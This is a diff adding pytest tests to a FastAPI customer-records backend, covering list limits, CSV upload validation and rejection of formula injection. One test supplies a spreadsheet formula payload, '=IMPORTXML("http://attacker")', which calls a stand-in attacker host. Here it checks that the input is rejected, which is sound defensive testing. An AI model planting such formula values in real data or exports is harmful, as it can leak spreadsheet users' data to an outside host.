@@ -1,15 +1,18 @@
 import pytest
 from fastapi import HTTPException
+from pydantic import ValidationError
 
 from app.api.auth import upsert_authenticated_user
 from app.api.clientes import _ensure_cliente_access
 from app.core.auth import require_role
 from app.models.cliente import ClienteCreate
 from app.services.clientes import (
+    MAX_CSV_ROWS,
     create_cliente,
     delete_cliente,
     get_cliente_or_404,
     list_clientes,
+    parse_clientes_csv,
 )
 
 
@@ -110,6 +113,66 @@ def test_delete_cliente_hides_existing_document_without_physical_delete():
     assert stored["estado"] == "Inactivo"
     assert stored["deletedAt"] is not None
     assert list_clientes(db) == []
+
+
+def test_list_clientes_limits_large_responses():
+    db = FakeDb()
+    for index in range(105):
+        create_cliente(
+            db,
+            ClienteCreate(
+                nombre=f"Cliente {index}",
+                empresa=f"Empresa {index}",
+                email=f"cliente{index}@encipharm.cl",
+                rubro="Cerdos",
+                region="Maule",
+                vendedorUid="seller-1",
+            ),
+        )
+
+    assert len(list_clientes(db, limit=10)) == 10
+
+
+def test_cliente_rejects_formula_injection_payloads():
+    with pytest.raises(ValidationError):
+        ClienteCreate(
+            nombre="=IMPORTXML(\"http://attacker\")",
+            empresa="Empresa",
+            email="cliente@encipharm.cl",
+            rubro="Cerdos",
+            region="Maule",
+        )
+
+
+def test_csv_rejects_invalid_encoding():
+    with pytest.raises(HTTPException) as exc_info:
+        parse_clientes_csv(b"\xff\xfe\x00")
+
+    assert exc_info.value.status_code == 400
+
+
+def test_csv_rejects_oversized_file():
+    content = b"nombre,empresa,email\n" + (b"a" * 1_000_001)
+
+    with pytest.raises(HTTPException) as exc_info:
+        parse_clientes_csv(content)
+
+    assert exc_info.value.status_code == 413
+
+
+def test_csv_rejects_too_many_rows():
+    rows = [
+        "nombre,empresa,email",
+        *[
+            f"Cliente {index},Empresa {index},cliente{index}@encipharm.cl"
+            for index in range(MAX_CSV_ROWS + 1)
+        ],
+    ]
+
+    with pytest.raises(HTTPException) as exc_info:
+        parse_clientes_csv("\n".join(rows).encode("utf-8"))
+
+    assert exc_info.value.status_code == 413
 
 
 @pytest.mark.anyio
